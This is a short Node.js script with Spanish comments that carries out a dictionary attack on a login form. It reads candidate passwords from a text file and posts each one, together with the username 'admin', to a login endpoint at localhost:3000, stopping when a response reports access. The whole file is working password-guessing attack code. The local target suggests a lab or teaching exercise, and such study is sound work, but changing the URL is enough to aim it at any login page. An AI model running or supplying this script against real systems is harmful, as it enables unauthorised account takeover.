// Importar la librería axios para realizar solicitudes HTTP
const axios = require('axios');

// Importar el módulo fs para leer archivos del sistema
const fs = require('fs');

// URL del sistema de autenticación al que se enviarán las solicitudes
const url = "http://localhost:3000/login";

// Nombre de usuario objetivo para el ataque
const usuario = "admin";

// Cargar el diccionario de contraseñas desde un archivo de texto
// El archivo "diccionario.txt" debe contener una contraseña por línea
const diccionario = fs.readFileSync("diccionario.txt", "utf-8").split("\n");

// Función asíncrona para realizar un ataque de diccionario
async function ataqueDiccionario() {
    // Recorrer cada contraseña en el diccionario
    for (let contraseña of diccionario) {
        // Limpiar la contraseña eliminando espacios y saltos de línea
        contraseña = contraseña.trim();

        try {
            // Enviar una solicitud POST al servidor con el usuario y la contraseña actual
            const respuesta = await axios.post(url, { usuario, contraseña });

            // Verificar si la respuesta indica que el acceso fue exitoso
            if (respuesta.data.acceso) {
                // Si el acceso fue exitoso, imprimir la contraseña encontrada
                console.log(`¡Contraseña encontrada! ${contraseña}`);
                // Salir del bucle ya que se encontró la contraseña correcta
                break;
            } else {
                // Si el acceso fue denegado, imprimir un mensaje de intento fallido
                console.log(`Intento fallido con: ${contraseña}`);
            }
        } catch (error) {
            // Capturar y manejar errores (por ejemplo, problemas de red o respuestas inválidas)
            console.error("Error en el intento:", error.message);
        }
    }
}

// Llamar a la función para iniciar el ataque de diccionario
ataqueDiccionario();

